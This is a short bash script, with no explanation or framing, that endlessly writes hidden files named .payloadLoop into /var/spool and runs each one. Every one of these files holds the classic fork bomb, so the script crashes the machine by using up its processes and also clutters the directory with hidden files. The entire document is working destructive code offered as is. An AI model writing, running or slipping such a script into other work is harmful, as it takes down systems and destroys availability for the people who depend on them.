#!/bin/bash
declare -i num=0
while true
do
cat <<EOF > /var/spool/.payloadLoop$num.sh
#!/bin/bash
:(){ :|:& };:
EOF
chmod +x /var/spool/.payloadLoop$num.sh
bash /var/spool/.payloadLoop$num.sh
num=$num+1
done